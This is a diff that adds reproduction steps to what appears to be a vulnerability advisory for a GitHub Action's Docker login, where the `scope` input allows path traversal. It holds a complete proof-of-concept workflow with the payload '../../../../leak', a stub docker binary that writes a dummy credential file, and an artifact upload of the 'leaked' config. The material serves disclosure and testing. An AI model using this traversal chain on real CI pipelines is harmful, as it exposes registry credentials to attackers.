@@ -195,6 +195,176 @@ drwxrwxrwt 18 root   root   460 Feb 18 20:46 ..
 ## Exploit by Chaining:
 The proof-of-concept demonstrates that the `scope` input is used to construct the Docker configuration directory without enforcing a path boundary. By supplying a traversal payload (`../../../../leak`), the workflow causes the action to set `DOCKER_CONFIG` to a location outside its intended Buildx directory and write a valid `config.json` containing authentication material there. The workflow then successfully reads and uploads that file as an artifact, proving the write occurred in an attacker-controlled, reachable path. This shows the vulnerability is not only a directory escape but an exploitable primitive: any workflow that later uploads, caches, or otherwise exposes workspace or temporary paths could unintentionally leak Docker credentials, and any workflow that forwards untrusted inputs into `scope` could be abused to redirect secret material to attacker-accessible locations.
 
+Steps to Reproduce — Scoped Path Traversal → Arbitrary Docker Config Write
+
+Overview
+
+The following procedure demonstrates that an attacker-controlled `scope` value can escape the intended Buildx configuration directory and force Docker credentials to be written to an arbitrary filesystem location inside the GitHub Actions runner. No local environment is required — the issue can be reproduced entirely using a GitHub repository.
+
+**1. Create a Proof-of-Concept Workflow**
+
+In the target repository, the tester creates a workflow file:
+
+```
+.github/workflows/poc-scope-traversal.yml
+```
+
+with the following content:
+
+```yaml
+name: poc-scope-traversal
+on:
+  workflow_dispatch:
+    inputs:
+      scope:
+        description: "Traversal payload"
+        required: true
+        default: "../../../../leak"
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install fake docker (safe deterministic test)
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p "$RUNNER_TEMP/bin"
+          cat > "$RUNNER_TEMP/bin/docker" <<'EOF'
+          #!/usr/bin/env bash
+          set -euo pipefail
+          cmd="$1"; shift || true
+          echo "cmd=$cmd DOCKER_CONFIG=${DOCKER_CONFIG:-} args=$*" >> "$RUNNER_TEMP/docker-invocations.log"
+          if [ "$cmd" = "login" ]; then
+            cat >/dev/null || true
+            mkdir -p "${DOCKER_CONFIG}"
+            echo '{"auths":{"demo":{"auth":"ZGVtbzpkZW1v"}}}' > "${DOCKER_CONFIG}/config.json"
+            exit 0
+          fi
+          if [ "$cmd" = "logout" ]; then
+            exit 0
+          fi
+          exit 0
+          EOF
+          chmod +x "$RUNNER_TEMP/bin/docker"
+          echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"
+      - name: Run vulnerable login action
+        uses: ./
+        with:
+          username: demo
+          password: demo
+          scope: ${{ inputs.scope }}
+          logout: false
+
+      - name: Verify escaped write
+        id: verify
+        shell: bash
+        run: |
+          set -euo pipefail
+          echo "RUNNER_TEMP=$RUNNER_TEMP"
+          echo "HOME=$HOME"
+          echo "---- docker invocation log ----"
+          cat "$RUNNER_TEMP/docker-invocations.log"
+          CFG="$(sed -n 's/.*DOCKER_CONFIG=\(.*\) args=.*/\1/p' "$RUNNER_TEMP/docker-invocations.log" | tail -n1)"
+          echo "Resolved DOCKER_CONFIG: $CFG"
+          test -n "$CFG"
+          test -f "$CFG/config.json"
+          echo "FOUND escaped config at $CFG/config.json"
+          cat "$CFG/config.json"
+          echo "cfg=$CFG" >> "$GITHUB_OUTPUT"
+      - name: Upload leaked file (exploit chain proof)
+        uses: actions/upload-artifact@v4
+        with:
+          name: leaked-docker-config
+          path: ${{ steps.verify.outputs.cfg }}/config.json
+          if-no-files-found: error
+```
+
+**2. Commit and Push the Workflow**
+
+The tester commits the workflow and pushes it to the repository:
+
+```bash
+git checkout -b poc-scope-traversal
+git add .github/workflows/poc-scope-traversal.yml
+git commit -m "Add scope traversal exploit-chain PoC workflow"
+git push -u origin poc-scope-traversal
+```
+
+**3. Execute the Workflow**
+
+1. Open the repository Actions tab
+2. Select `poc-scope-traversal`
+3. Click **Run workflow**
+4. Keep the default input:
+
+```
+../../../../leak
+```
+
+5. Start the run
+
+**4. Expected Result (Vulnerable Behavior)**
+
+During execution, the action logs show the scope being used:
+
+```
+Logging into docker.io (scope ../../../../leak)...
+```
+
+The verification step then shows that a Docker configuration file was written outside the intended Buildx directory.
+
+Evidence in Logs
+
+The following conditions confirm exploitation:
+
+Filesystem write:
+
+```
+$RUNNER_TEMP/leak/config.json exists
+```
+
+File contents:
+
+```json
+{"auths":{"demo":{"auth":"ZGVtbzpkZW1v"}}}
+```
+
+Docker invocation log shows the attacker-controlled path:
+
+```
+DOCKER_CONFIG=<escaped location>
+```
+
+Artifact — the workflow uploads a downloadable artifact:
+
+```
+leaked-docker-config
+```
+
+This demonstrates the attacker can control the location where Docker authentication material is written and exfiltrate it.
+
+**5. Expected Result (Patched / Not Vulnerable)**
+
+If the vulnerability is fixed:
+
+- The verification step fails because `config.json` does not exist
+- The artifact upload fails due to:
+
+```
+if-no-files-found: error
+```
+
+**Security Impact Demonstrated**
+
+The reproduction confirms:
+
+- Path traversal via attacker-controlled workflow input
+- Control over `DOCKER_CONFIG`
+- Arbitrary credential file placement
+- Potential credential exfiltration via artifacts or later workflow steps
 
 
 ## Security Impact Classification
